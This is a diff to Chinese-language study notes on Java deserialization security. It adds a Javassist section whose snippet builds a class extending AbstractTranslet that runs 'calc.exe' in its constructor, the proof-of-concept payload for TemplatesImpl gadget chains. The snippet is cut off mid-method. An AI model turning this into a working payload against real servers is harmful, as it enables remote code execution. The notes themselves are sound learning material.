@@ -12,6 +12,7 @@
   - [反序列化](#反序列化)
     - [前置知识](#前置知识)
   - [反射](#反射)
+  - [Javassist](#javassist)
   - [JAVA代理机制](#java代理机制)
     - [代理类](#代理类)
     - [调用处理器(InvocationHanlder)](#调用处理器invocationhanlder)
@@ -60,6 +61,18 @@ Bootstrap 类加载器是用 C++ 实现的，是虚拟机自身的一部分，�
 * 反序列化数据的特征:前四个字节为`0xaced(Magic Number)0005(Version).
 ## 反射
 
+## Javassist
+Javassist是一个用来处理Java字节码的类库.
+```java
+    public static void main(String[] args) throws Exception{
+            ClassPool pool = ClassPool.getDefault();
+            CtClass cc = pool.makeClass("poctest");
+            cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));
+            CtConstructor cons = new CtConstructor(new CtClass[]{},cc);
+            cons.setBody("{ Runtime.getRuntime().exec(\"calc.exe\");}");
+            cc.addConstructor(cons);
+            byte[] bytecodes=cc.toBytecode();
+```
 ## JAVA代理机制
 ### 代理类
 代理类可以在运行时创建全新的类,能够实现指定的接口,具有以下方法:
